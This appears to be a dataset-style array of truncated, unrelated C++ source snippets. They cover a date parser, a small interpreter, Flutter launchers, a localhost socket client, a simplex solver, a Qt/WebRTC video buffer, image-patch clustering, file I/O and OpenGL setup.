data_hub.erase(data_hub.end());\n}\n\nvoid database_out (const vector<input> &data){//funcion para agregar datos al txt\n    remove(\"database.txt\");\n    ofstream database; \n    database.open(\"database.txt\", ios::app); \n    if (database.fail()){ \n        cout<<\"no se pudo abrir el archivo\";\n    }\n    for (int i = 0; i < data.size(); ++i){ \n        database<<data[i].year<<\"y\"<<data[i].month<<\"m\"<<data[i].day<<\"d\"<<data[i].event<<endl;\n    }            \n}\n\nvoid check_data (string command, vector<input> &data_hub){ //funcion para verificar si los datos son correctos\n    input data; \n    string date, event;\n    string info; \n    getline(cin,info); \n    string event_no_spaces; \n    string year, month, day, extra = \"\"; \n    unsigned short int script = 0 ,script_control=0 ; \n    bool first_negation = false, second_negation = false; \n    bool pass = true; \n    for(int i =0;i<info.size();++i){\n        if(info[i]=='-'){\n            ++script;\n        }\n    }\n    for(int i =0; i<info.size();i++){\n        if(script_control<=script && pass != false){\n            if(info[i]=='-'){\n                ++script_control;\n            }\n            if(script_control==script && info[i]==' '){\n                pass=false;\n            } \n            if(pass==true){\n             date=date+info[i];\n            }\n        }\n        else{\n        event=event+info[i];\n        }\n    }\n    script=0;\n    pass=true;\n    for (int i = 0; i < date.size(); ++i){ \n        if (date[i] == '0' || date[i] == '1' || date[i] == '2' || date[i] == '3' || date[i] == '4' || date[i] == '5' || date[i] == '6' || date[i] == '7' || date[i] == '8' || date[i] == '9' || date[i] == '-' || date[i]=='+'){ \n            if (date[i] == '-' && i != 0){ \n                ++script;   \n                if (date[i+1] == '-'){ \n                    if (script == 1){ \n                        first_negation = true;\n                    }\n                    if (script == 2){   \n                        second_negation = true;\n                    }\n                    ++i; \n                }    \n            }\n            if (script == 0){ \n                year = year + date[i];\n            }\n            if (script == 1){ \n                month = month + date[i];\n            }\n            if (script == 2){ \n                day = day + date[i];\n            }\n            if (script > 2){ \n                extra = extra + date[i];\n            }\n            if (extra.size() > 0){ \n                cout<<\"Wrong date format:\"<<date<<endl;\n                pass = false;\n                break;\n            }\n        }\n        else{ \n            cout<<\"Wrong date format:\"<<date<<endl;\n            pass = false;\n            break;\n        }\n    }\n    //se comprueba si hay +\n    unsigned short int mas=0;\n    bool mas_true=false,wrong_format=false;\n    for(int i=0;i<year.size();i++){\n        if(year[i]=='+'){\n            mas++;\n        }\n        if(year[0]=='-' && year[1]=='+' || i==0 && year[i]=='+'){\n     ",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <regex>\n#include <unordered_map>\n#include <sstream>\n#include <limits>\n#include <cmath>\n#include <stack>\n\nusing namespace std;\n\nenum TokenType {\n    COMMAND,\n    VARIABLE,\n    OPERATOR,\n    ASSIGNMENT,\n    NUMBER,\n    LPAREN,\n    RPAREN,\n    UNKNOWN\n};\n\nstruct Token {\n    TokenType type;\n    string value;\n};\n\nvector<Token> tokenize(const string& command) {\n    vector<Token> tokens;\n    regex tokenPattern(\"(BEG|PRINT|HELP|EXIT!|[a-zA-Z_][a-zA-Z0-9_]*|[-]?\\\\d*\\\\.?\\\\d+|=|\\\\+|\\\\-|\\\\*|\\\\/|\\\\%|\\\\(|\\\\))\");\n    auto words_begin = sregex_iterator(command.begin(), command.end(), tokenPattern);\n    auto words_end = sregex_iterator();\n\n    for (sregex_iterator i = words_begin; i != words_end; ++i) {\n        smatch match = *i;\n        string token = match.str();\n        \n        if (regex_match(token, regex(\"(BEG|PRINT|HELP|EXIT!)\"))) {\n            tokens.push_back({COMMAND, token});\n        } else if (regex_match(token, regex(\"[a-zA-Z_][a-zA-Z0-9_]*\"))) {\n            tokens.push_back({VARIABLE, token});\n        } else if (regex_match(token, regex(\"[-]?\\\\d*\\\\.?\\\\d+\"))) {\n            tokens.push_back({NUMBER, token});\n        } else if (token == \"=\") {\n            tokens.push_back({ASSIGNMENT, token});\n        } else if (token == \"(\") {\n            tokens.push_back({LPAREN, token});\n        } else if (token == \")\") {\n            tokens.push_back({RPAREN, token});\n        } else if (token == \"+\" || token == \"-\" || token == \"*\" || token == \"/\" || token == \"%\") {\n            tokens.push_back({OPERATOR, token});\n        } else {\n            tokens.push_back({UNKNOWN, token});\n        }\n    }\n\n    // Check for unknown words\n    string remaining = command;\n    for (const auto& token : tokens) {\n        size_t pos = remaining.find(token.value);\n        if (pos != string::npos) {\n            remaining.erase(pos, token.value.length());\n        }\n    }\n    remaining = regex_replace(remaining, regex(\"\\\\s+\"), \"\");\n\n    for (char c : remaining) {\n        if (!isspace(c)) {\n            cout << \"Unknown word [\" << remaining << \"]\" << endl;\n            tokens.clear();\n            break;\n        }\n    }\n    \n    return tokens;\n}\n\n// Function to handle the HELP command\nvoid printHelp() {\n    cout << \"Available commands:\\n\";\n    cout << \"HELP                                    - Display this help message\\n\";\n    cout << \"BEG <variable>                          - Input value for given var\\n\";\n    cout << \"PRINT <variable>                        - Display value of given variable\\n\";\n    cout << \"<variable> = <number> | <expression>    - Display value of given variable\\n\";\n    cout << \"EXIT!                                   - Exit the SNOL environment\\n\";\n}\n\n// Storage for variables and their types\nunordered_map<string, pair<string, float>> variables;\n\n// Function to handle the BEG command\nvoid beg(const string& varName) {\n    // Validate variable name\n    if (!regex_match(varName, regex(\"^[a-zA-Z_][a-zA-Z0-9_]*$\"))) {\n        cout << \"SNOL> Error: Invalid variable name [\" << varName << \"] Enter HELP for a list of available commands.\" << endl;\n        return;\n    }\n    \n    cout << \"SNOL> Please enter value for [\" << varName << \"]\\nInput: \";\n    string input;\n    getline(cin, input);\n    stringstream ss(input);\n    float value;\n    ss >> value;\n\n    // Check for invalid number format\n    if (ss.fail() || !ss.eof()) {\n        cout << \"SNOL> Invalid number format [\" << input << \"] Enter HELP for a list of available commands.\" << endl;\n        return;\n    }\n\n    // Check if the input is a float or int\n    if (input.find('.') != string::npos) {\n        variables[varName] = {\"float\", value};\n    } else {\n        variables[varName] = {\"int\", value};\n    }\n}\n\n// Function to handle the PRINT command\nvoid print(const string& varName) {\n    if (variables.find(varName) != variables.end()) {\n        cout << \"SNOL> [\" << varName << \"] = \" << variables[varName].second << endl;\n    } else {\n        cout << \"SNOL> Error! [\" << varName << \"] is not defined! Enter HELP for a list of available commands.\" << endl;\n    }\n}\n\n// Helper function to get the precedence of an operator\nint getPrecedence(const string& op) {\n    if (op == \"+\" || op == \"-\") return 1;\n    if (op == \"*\" || op == \"/\" || op == \"%\") return 2;\n    return 0;\n}\n\n// Helper function to perform arithmetic operations\nfloat applyOperator(float a, float b, const string& op) {\n    if (op == \"+\") return a + b;\n    if (op == \"-\") return a - b;\n    if (op == \"*\") return a * b;\n    if (op == \"/\") return a / b;\n    if (op == \"%\") return fmod(a, b);\n    throw invalid_argument(\"SNOL> Invalid operator\");\n}\n\n// Function to check for balanced parentheses\nbool checkParentheses(const vector<Token>& tokens) {\n    stack<char> parentheses;\n    for (const auto& token : tokens) {\n        if (token.type == LPAREN) {\n            parentheses.push('(');\n        } else if (token.type == RPAREN) {\n            if (parentheses.empty()) {\n                return fals",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"linkedin_clone\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <netinet/in.h>\n\nconst int SERVER_PORT = 8080;\nconst int MAX_BUFFER_SIZE = 1024;\n\nstruct Command {\n    int commandType;\n};\n\nclass Client {\n    int clientSock;\npublic:\n    Client() : clientSock(-1) {}\n\n    ~Client() { StopClient(); }\n\n    void StartClient() {\n        clientSock = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);\n\n        if (clientSock == -1) {\n            std::cerr << \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0441\u043e\u043a\u0435\u0442\" << std::endl;\n            exit(1);\n        }\n\n        struct sockaddr_in serverAddress{};\n        serverAddress.sin_family = AF_INET;\n        serverAddress.sin_port = htons(SERVER_PORT);\n\n        if (inet_pton(AF_INET, \"127.0.0.1\", &(serverAddress.sin_addr)) <= 0) {\n            std::cerr << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 IP \u0430\u0434\u0440\u0435\u0441\" << std::endl;\n            exit(1);\n        }\n\n        if (connect(clientSock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {\n            std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f \u0441 \u0441\u0435\u0440\u0432\u0435\u0440\u043e\u043c\" << std::endl;\n            exit(1);\n        }\n\n        std::cout << \"\u0421\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435 \u0441 \u0441\u0435\u0440\u0432\u0435\u0440\u043e\u043c \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u043e\" << std::endl;\n    }\n\n    void send_command() {\n        Command command;\n        command.commandType = 0;\n\n        while (true) {\n            if (send(clientSock, &command, sizeof(command), 0) < 0) {\n                std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0435 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0441\u0435\u0440\u0432\u0435\u0440\u0443\" << std::endl;\n                break;\n            }\n        }\n    }\n\n    void recv_command() {\n        Command command;\n        command.commandType = 0;\n\n        while (true) {\n            if (recv(clientSock, &command, sizeof(command), 0) < 0) \n            {\n                std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u0440\u0438\u0435\u043c\u0435 \u0434\u0430\u043d\u043d\u044b\u0445 \u043e\u0442 \u0441\u0435\u0440\u0432\u0435\u0440\u0430\" << std::endl;\n                break;\n            }\n        }\n    }\n\n    void StopClient() {\n        shutdown(clientSock, 2);\n\n        if (clientSock != -1) {\n            close(clientSock);\n            clientSock = -1;\n        }\n    }\n};\n\nint main() {\n    Client client;\n\n    client.StartClient();\n\n    client.send_command();\n    client.recv_command();\n\n    client.StopClient();\n\n    return 0;\n}",
    "#include \"Simplex.h\"\n\nextern double pInf;\nextern double nInf;\nextern double EPSILON_1;\n\nvoid Simplex::findInitialSolution()\n{\n    x.resize(data.n);\n    c_B.resize(data.m);\n    d.resize(data.m);\n\n    for (size_t i = 0; i < data.B.size(); i++)\n    {\n        c_B(i) = data.c[data.B[i]];\n    }\n\n    // VectorXd x_N(data.n - data.m);\n\n    // for (size_t i = 0; i < data.N.size(); i++)\n    // {\n    //     int xi = data.N[i];\n    //     Nb.col(i) = data.A.col(xi);\n    // if (data.u[xi] == pInf && data.l[xi] == nInf)\n    //     x_N[i] = 0;\n    // else if (data.u[xi] == pInf)\n    //     x_N[i] = data.l[xi];\n    // else\n    //     x_N[i] = data.u[xi];\n    // }\n\n    // // VectorXd effectXN = Nb * x_N;\n    x << 1, 0, -2, 3, 2, 0, 0, 3, 0, 5, -1, 1;\n    // x << 0, 0, 0, 0, 225, 117, 420;\n    // x << 0, 0, 2, 3;\n}\n\npair<int, int> Simplex::chooseEnteringVariable()\n{\n    pair<int, int> variable(-1, 0);\n    VectorXd y = gs.BTRAN(c_B);\n\n    // calculando o custo reduzido\n\n    cout << \"duais: \" << y.transpose() << endl;\n\n    VectorXd reduced_cost = data.c - data.A.transpose() * y;\n\n    cout << \"reduced_cost: \" << reduced_cost.transpose() << endl;\n\n    // escolhendo a variavel de entrada\n\n    //double testBetter = EPSILON_1;\n\n    for (size_t i = 0; i < data.N.size(); i++)\n    {\n        int xi = data.N[i];\n        if (reduced_cost(xi) < -EPSILON_1 && x[xi] - EPSILON_1 > data.l[xi])\n        {\n            variable.first = xi;\n            variable.second = -1;\n            break;\n        }\n        else if (reduced_cost(xi) > EPSILON_1 && x[xi] + EPSILON_1 < data.u[xi])\n        {\n            variable.first = xi;\n            variable.second = 1;\n            break;    \n        }\n    }\n\n    return variable;\n}\n\npair<int, double> Simplex::chooseLeavingVariable(pair<int, int> enteringVariable)\n{\n    pair<int, double> variable(-1, 0);\n\n    int t_sign = enteringVariable.second;\n\n    // calculando vetor dire\u00e7\u00e3o\n    d = gs.FTRAN(data.A.col(enteringVariable.first));\n\n    cout << \"vetor d: \" << d.transpose() << endl;\n\n    VectorXd step(data.m);\n\n    for (size_t i = 0; i < data.B.size(); i++)\n    {\n        int xi = data.B[i];\n        // caso d(i) seja zero\n        if (d(i) == 0)\n            step(i) = pInf;\n        // caso d(i) e -t_sign tenham sinais iguais\n        else if (d(i) * -t_sign > EPSILON_1)\n            step(i) = (data.u[xi] - x[xi]) / abs(d(i));\n        // caso d(i) e -t_sign tenham sinais opostos\n        else if (d(i) * -t_sign < -EPSILON_1)\n            step(i) = (x[xi] - data.l[xi]) / abs(d(i));\n    }\n\n    cout << \"vetor t: \" << step.transpose() << endl;\n\n    // escolhendo a variavel de saida\n\n    double min_step = pInf;\n\n    for (size_t i = 0; i < data.B.size(); i++)\n    {\n        if (step(i) < min_step)\n        {\n            min_step = step(i);\n            variable.first = data.B[i];\n        }\n    }\n\n    if (min_step > data.u[enteringVariable.first] - data.l[enteringVariable.first])\n    {\n        variable.first = enteringVariable.first;\n        variable.second = data.u[enteringVariable.first] - data.l[enteringVariable.first];\n        return variable;\n    }\n\n    variable.second = min_step;\n\n    return variable;\n}\n\nvoid Simplex::updateBasis(pair<int, int> enteringVariable, pair<int, double> leavingVariable)\n{\n    // atualizando x_B\n\n    int t_signal = enteringVariable.second;\n\n    for (size_t i = 0; i < data.B.size(); i++)\n    {\n        x[data.B[i]] += leavingVariable.second * -t_signal * d(i);\n    }\n\n    // atualizando x_j\n\n    x[enteringVariable.first] += leavingVariable.second * t_signal;\n\n    // caso a variavel de entrada n\u00e3o seja b\u00e1sica\n    if (enteringVariable.first == leavingVariable.first)\n        return;\n\n    // atualizando a base\n    for (size_t i = 0; i < data.B.size(); i++)\n    {\n        if (data.B[i] == leavingVariable.first)\n        {\n            data.B[i] = enteringVariable.first;\n            pair<int, VectorXd> E_(i, d);\n            gs.addEk(E_);\n            break;\n        }\n    }\n\n    // atualizando N\n    for (size_t i = 0; i < data.N.size(); i++)\n    {\n        if (data.N[i] == enteringVariable.first)\n        {\n            data.N[i] = leavingVariable.first;\n            break;\n        }\n    }\n\n    // atualizando c_B\n    for (size_t i = 0; i < data.B.size(); i++)\n    {\n        c_B(i) = data.c[data.B[i]];\n    }\n    cout << c_B.transpose() << endl;\n    cout << x.transpose() << endl;\n}\n\ndouble Simplex::objectiveFunction()\n{\n    return data.c.transpose() * x;\n}",
    "// Copyright (C) 2024 Deltarion Systems\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//      http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include \"rtcqvideoframebuffer.h\"\n\n#include \"rtcnativemutablei420buffer.h\"\n\n#include \"api/video/i420_buffer.h\"\n#include \"common_video/libyuv/include/webrtc_libyuv.h\"\n#include \"rtc_base/checks.h\"\n#include \"rtc_base/logging.h\"\n#include \"third_party/libyuv/include/libyuv.h\"\n\n#include <QDebug>\n\nRTCQVideoFrameBuffer::RTCQVideoFrameBuffer(QVideoFrame &pixelBuffer, QObject *parent)\n    : IRTCVideoFrameBuffer(parent), pixelBuffer_(pixelBuffer)\n{\n    cropX_ = 0;\n    cropY_ = 0;\n    cropWidth_ = pixelBuffer.width();\n    cropHeight_ = pixelBuffer.height();\n}\n\nRTCQVideoFrameBuffer::RTCQVideoFrameBuffer(QVideoFrame &pixelBuffer, int adaptedWidth,\n                                           int adaptedHeight, int cropWidth, int cropHeight,\n                                           int cropX, int cropY, QObject *parent)\n    : IRTCVideoFrameBuffer(parent), pixelBuffer_(pixelBuffer)\n{\n    width_ = adaptedWidth;\n    height_ = adaptedHeight;\n    pixelBuffer_ = pixelBuffer;\n    bufferWidth_ = pixelBuffer.width();\n    bufferHeight_ = pixelBuffer.height();\n    cropX_ = cropX & ~1;\n    cropY_ = cropY & ~1;\n    cropWidth_ = cropWidth;\n    cropHeight_ = cropHeight;\n}\n\nQVideoFrame &RTCQVideoFrameBuffer::pixelBuffer() const\n{\n    return const_cast<QVideoFrame &>(pixelBuffer_);\n}\n\nint RTCQVideoFrameBuffer::width() const\n{\n    return width_;\n}\n\nint RTCQVideoFrameBuffer::height() const\n{\n    return height_;\n}\n\nint RTCQVideoFrameBuffer::cropX() const\n{\n    return cropX_;\n}\n\nint RTCQVideoFrameBuffer::cropY() const\n{\n    return cropY_;\n}\n\nint RTCQVideoFrameBuffer::cropWidth() const\n{\n    return cropWidth_;\n}\n\nint RTCQVideoFrameBuffer::cropHeight() const\n{\n    return cropHeight_;\n}\n\nQVector<int> RTCQVideoFrameBuffer::supportedPixelFormats()\n{\n    return QVector<int>();\n}\n\nbool RTCQVideoFrameBuffer::requiresCropping() const\n{\n    return cropWidth_ != bufferWidth_ || cropHeight_ != bufferHeight_;\n}\n\nbool RTCQVideoFrameBuffer::requiresScalingToWidth(int width, int height) const\n{\n    return cropWidth_ != width || cropHeight_ != height;\n}\n\nint RTCQVideoFrameBuffer::bufferSizeForCroppingAndScalingToWidth(int width, int height) const\n{\n    QVideoFrameFormat::PixelFormat srcPixelFormat = pixelBuffer_.pixelFormat();\n\n    switch (srcPixelFormat)\n    {\n    case QVideoFrameFormat::PixelFormat::Format_NV12: {\n        int srcChromaWidth = (cropWidth_ + 1) / 2;\n        int srcChromaHeight = (cropHeight_ + 1) / 2;\n        int dstChromaWidth = (width + 1) / 2;\n        int dstChromaHeight = (height + 1) / 2;\n\n        return srcChromaWidth * srcChromaHeight * 2 + dstChromaWidth * dstChromaHeight * 2;\n    }\n    case QVideoFrameFormat::PixelFormat::Format_BGRA8888:\n    case QVideoFrameFormat::PixelFormat::Format_ARGB8888: {\n        return 0; // Scaling RGBA frames does not require a temporary buffer.\n    }\n    default:\n        RTC_DCHECK_NOTREACHED() << \"Unsupported pixel format.\";\n        return 0;\n    }\n}\n\nbool RTCQVideoFrameBuffer::cropAndScaleTo(QVideoFrame &outputPixelBuffer, uint8_t *tmpBuffer)\n{\n    QVideoFrameFormat::PixelFormat srcPixelFormat = pixelBuffer_.pixelFormat();\n    QVideoFrameFormat::PixelFormat dstPixelFormat = outputPixelBuffer.pixelFormat();\n\n    switch (srcPixelFormat)\n    {\n    case QVideoFrameFormat::PixelFormat::Format_NV12: {\n        int dstWidth = outputPixelBuffer.width();\n        int dstHeight = outputPixelBuffer.height();\n        if (dstWidth > 0 && dstHeight > 0)\n        {\n            RTC_DCHECK(dstPixelFormat == QVideoFrameFormat::PixelFormat::Format_NV12);\n            if (requiresScalingToWidth(dstWidth, dstHeight))\n            {\n                RTC_DCHECK(tmpBuffer);\n            }\n            cropAndScaleNV12To(outputPixelBuffer, tmpBuffer);\n        }\n        break;\n    }\n    case QVideoFrameFormat::PixelFormat::Format_BGRA8888:\n    case QVideoFrameFormat::PixelFormat::Format_ARGB8888: {\n        RTC_DCHECK(srcPixelFormat == dstPixelFormat);\n        cropAndScaleARGBTo(outputPixelBuffer);\n        break;\n    }\n    default:\n        RTC_DCHECK_NOTREACHED() << \"Unsupported pixel format.\";\n    }\n\n    return true;\n}\n\nIRTCVideoFrameBuffer *RTCQVideoFrameBuffer::cropAndScaleWith(int offsetX, int offsetY,\n                                                             int cropWidth, int cropHeight,\n                                                             int scaleWidth, int scaleHeight)\n{\n    return new RTCQVideoFrameBuffer(pixelBuffer_, width_, ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fitness\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <filesystem>\n#include <opencv2/opencv.hpp>\n#include <highfive/H5Easy.hpp>\n#include <armadillo>\n#include <random>\n#include <vector>\n#include <map>\n#include <algorithm>\n#include <unordered_set>\n\nnamespace fs = std::filesystem;\nusing namespace HighFive;\n\n// Function to extract patches from an image\nstd::vector<cv::Mat> extractPatches(const cv::Mat& img, int patchSize) {\n    std::vector<cv::Mat> patches;\n    for (int y = 0; y <= img.rows - patchSize; y += patchSize) {\n        for (int x = 0; x <= img.cols - patchSize; x += patchSize) {\n            patches.push_back(img(cv::Rect(x, y, patchSize, patchSize)).clone());\n        }\n    }\n    return patches;\n}\n\n// Function to randomly select a percentage of patches\nstd::vector<cv::Mat> selectRandomPatches(const std::vector<cv::Mat>& patches, float percentage) {\n    std::vector<cv::Mat> selectedPatches;\n    std::sample(patches.begin(), patches.end(), std::back_inserter(selectedPatches),\n                static_cast<size_t>(patches.size() * percentage), std::mt19937{std::random_device{}()});\n    return selectedPatches;\n}\n\n// Function to flatten patches\ncv::Mat flattenPatches( const std::vector<cv::Mat>& patches) {\n    cv::Mat flatPatches(patches.size(), patches[0].total(), patches[0].type());\n    for (int i = 0; i < patches.size(); ++i) {\n        cv::Mat patchRow(1, patches[i].total(), patches[i].type());\n        patches[i].reshape(3, 1).copyTo(patchRow);\n        patchRow.copyTo(flatPatches.row(i));\n    }\n    return flatPatches;\n}\n\n// Function to convert cv::Mat to std::vector for H5Easy\ntemplate <typename T>\nstd::vector<T> matToVector(const cv::Mat& mat) {\n    return std::vector<T>(mat.begin<T>(), mat.end<T>());\n}\n\n// Function to convert cv::Mat to std::vector<std::vector<T>> for H5Easy\ntemplate <typename T>\nstd::vector<std::vector<T>> matToVector2D(const cv::Mat& mat) {\n    std::vector<std::vector<T>> vec2D;\n    for (int i = 0; i < mat.rows; ++i) {\n        vec2D.push_back(matToVector<T>(mat.row(i)));\n    }\n    return vec2D;\n}\n\n// Function to save HDF5 file using H5Easy\nvoid saveHDF5(const std::string& filename, const cv::Mat& data, const cv::Mat& labels) {\n    // Create HDF5 file if it doesn't exist\n    H5Easy::File file(filename, H5Easy::File::Overwrite);\n\n    if (data.type() == CV_8U) {\n        H5Easy::dump(file, \"data\", matToVector2D<uint8_t>(data));\n    } else if (data.type() == CV_32F) {\n        H5Easy::dump(file, \"data\", matToVector2D<float>(data));\n    } else if (data.type() == CV_64F) {\n        H5Easy::dump(file, \"data\", matToVector2D<double>(data));\n    } else {\n        std::cout << \"Unsupported cv::Mat type to save: \" << data.type() << std::endl;\n        throw std::runtime_error(\"Unsupported cv::Mat type\");\n    }\n    H5Easy::dump(file, \"labels\", matToVector2D<float>(labels));\n}\n\n// Function to convert CV_8UC3 cv::Mat to CV_64FC1\ncv::Mat convertToCV64FC1(const cv::Mat& input) {\n    assert(input.type() == CV_8UC3);\n\n    cv::Mat outputC3;\n    input.convertTo(outputC3, CV_64FC3); // Convert types\n    cv::Mat output = outputC3.reshape(1, outputC3.rows); // Flatten to 1 channel\n    cv::normalize(output, output, 0, 1, cv::NORM_MINMAX); // Normalize to range 0-1\n\n    return output;\n}\n\n// Function to convert CV_64FC1 cv::Mat to CV_8UC3\ncv::Mat convertToCV8UC3(const cv::Mat& input) {\n    assert(input.type() == CV_64FC1);\n    cv::Mat output;\n    cv::normalize(input, output, 0, 255, cv::NORM_MINMAX); // Normalize to range 0-255\n    output = output.reshape(3, input.rows); // Reshape to 3 channels\n    output.convertTo(output, CV_8UC3); // Convert types\n\n    return output;\n}\n\n// Function to create a tiled PNG from k-means centroids\nvoid saveCentroidsAsImage(const cv::Mat& centers, int patchHeight, const std::string& filename) {\n    int numClusters = centers.rows;\n    int tileSize = static_cast<int>(std::sqrt(numClusters));    // Number of tiles per row\n    int imageSize = tileSize * patchHeight;                    // Size of the output image\n    cv::Mat image(imageSize, imageSize, CV_32FC3);\n    int idx = 0;\n    // Place each centroid in a tile\n    for (int y = 0; y < imageSize; y += patchHeight) {\n        for (int x = 0; x < imageSize; x += patchHeight) {\n            if (idx < numClusters) {\n                cv::Mat patch = centers.row(idx).reshape(3, patchHeight);   // Reshape to 3 channels\n                patch.copyTo(image(cv::Rect(x, y, patchHeight, patchHeight))); // Copy to the output image\n                ++idx;\n            }\n        }\n    }\n    // Convert to 8-bit unsigned integer\n    image.convertTo(image, CV_8U);\n    cv::imwrite(filename, image);\n}\n\n// Function to crop an image to a random square\ncv::Mat randomSquareCrop(const cv::Mat& img, int size) {\n    int x = std::rand() % (img.cols - size + 1);    // Random x-coordinate\n    int y = std::rand() % (img.rows - size + 1);    // Random y-coordinate\n    return img(cv::Rect(x, y, size, size)).clone(); // Return the cropped image\n}\n\n// Function to load a cv::Mat from an HDF5 file\ntemplat",
    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\n\n\n\nint main() {\n\n\t//unuk menyimpan data berbentuk string\n\tstring baris;\n\n\t//membuka file dalam mode menulis\n\tofstream outfile;\n\n\t//menunjuk ke sebuah nama file\n\toutfile.open(\"contohfile.txt\");\n\n\tcout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n\t//unlimited loop untuk menulis\n\twhile (true) {\n\t\tcout << \"- \";\n\t\t//mendapatkan setiap karakter dalam satu baris\n\t\tgetline(cin, baris);\n\t\t//loop akan berhenti jika anda memasukan karakter q\n\t\tif (baris == \"q\") break;\n\t\t//menulis dan memasukkan nilai dari 'baris' ke dalam file\n\t\toutfile << baris << endl;\n\t}\n\t//selesai dalam menulis sekarang tutup filenya\n\toutfile.close();\n\t//membuka file dalam mode menbaca\n\tifstream infile;\n\t//menunjuk ke sebuah file\n\tinfile.open(\"contohfile.txt\");\n\n\tcout << endl << \">= Membuka dan membaca file \" << endl;\n\t//jika file ada maka\n\tif (infile.is_open())\n\t{\n\t\t//melakukan perulangan setiap baris\n\t\twhile (getline(infile, baris))\n\t\t{\n\t\t\t//dan tampilkan di sini\n\t\t\tcout << baris << \"\\n\";\n\t\t}\n\t\t//tutup file tersebut setelah seesai\n\t\tinfile.close();\n\t}\n\t//jika tidak ditemukan file maka akan menampilkan ini\n\telse cout << \"Unable to open file\";\n\treturn 0;\n}",
    "#include <iostream>\n#include <stdio.h>\n\n#include <glad.h>\n#include <glfw3.h>\n\nusing namespace std;\n\n#include \"frame_timer.cpp\"\n\n#define Nx 512\n#define Ny 512\n\nvoid glinit(){\n\n    // transform\n    glViewport(0, 0, 512, 512);\n\n\tglMatrixMode(GL_PROJECTION); \n\tglLoadIdentity();\n\tglFrustum(-0.1, 0.1, -0.1, 0.1, 0.1, 1000);\n\t\n\tglMatrixMode(GL_MODELVIEW); \n\tglm::mat4 Mcam = glm::inverse(glm::mat4(1, 0, 0, 0,\n                                     0, 1, 0, 0,\n                                     0, 0, 1, 0,\n                                     0, 0, 0, 1));\n\tglLoadMatrixf(mat4ToFloatPtr(Mcam)); //gllookat matrics\n\tglTranslatef(0.1, -1, -1.5);\n\tglScalef(10, 10, 10);\n\t\n    //shading\n\tfloat ka[] = {1,1,1,1};\n    float kd[] = {1,1,1,1};\n    float ks[] = {0,0,0,1};\n    float p = 0;\n\n    glMaterialfv(GL_FRONT, GL_AMBIENT, ka);\n    glMaterialfv(GL_FRONT, GL_DIFFUSE, kd);\n    glMaterialfv(GL_FRONT, GL_SPECULAR, ks);\n    glMaterialf(GL_FRONT, GL_SHININESS, p);\n\n    // light \n\tglEnable(GL_LIGHTING);\n    float Ia[] = {0.2, 0.2, 0.2, 